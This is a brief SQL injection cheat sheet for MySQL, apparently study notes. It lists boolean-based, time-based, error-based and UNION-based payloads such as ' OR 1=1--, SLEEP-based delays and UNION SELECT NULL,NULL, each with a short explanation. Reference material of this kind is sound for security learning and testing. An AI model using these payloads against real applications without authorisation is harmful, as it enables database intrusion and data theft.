## Payloads
**Notes**: Different database systems use different SQL syntax.
Examples below are based on MYSQL.

Reference:
PortSwigger SQL Injection Cheat Sheet https://portswigger.net/web-security/sql-injection/cheat-sheet

## Boolean-based
Used to infer conditions by observing differences in application responses.

-  `' OR 1=1--`
-  `' AND 1=0--`

## Time-based
Used when no data or errors are returned. Inference is made based on response delays.

-  `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`
-  `SELECT SLEEP(10)`

## Error-based (Conditional)
Used to trigger database error when condition is true

-  `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

## UNION-based
Used to extract data from another table.

-  `UNION SELECT NULL,NULL`
**Note**: The injected SELECT statement must match the original query in both the number of columns and their data types.
